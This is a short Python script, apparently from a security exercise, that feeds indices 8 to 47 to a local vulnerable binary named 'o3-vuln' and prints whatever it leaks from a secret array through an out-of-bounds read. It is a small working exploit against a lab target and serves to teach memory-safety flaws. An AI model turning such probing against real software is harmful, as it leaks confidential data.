#!/usr/bin/env python

import subprocess

for i in range(8, 48):  # Essayer d'accéder à secret[]
    print(f"Starting subprocess {i} ...")
    proc = subprocess.Popen(["./o3-vuln"], stdin=subprocess.PIPE, stdout=subprocess.PIPE)

#    print(f"Communicating with subprocess {i} ...")
    output, _ = proc.communicate(input=f"{i}\n".encode())
#    print(f"{i}:[{output}]")

    if b"Element:" in output:
        leaked_value = output.split(b"Element: ")[1].strip()
        print(f"Leaked value at index {i}: {leaked_value.decode()}")

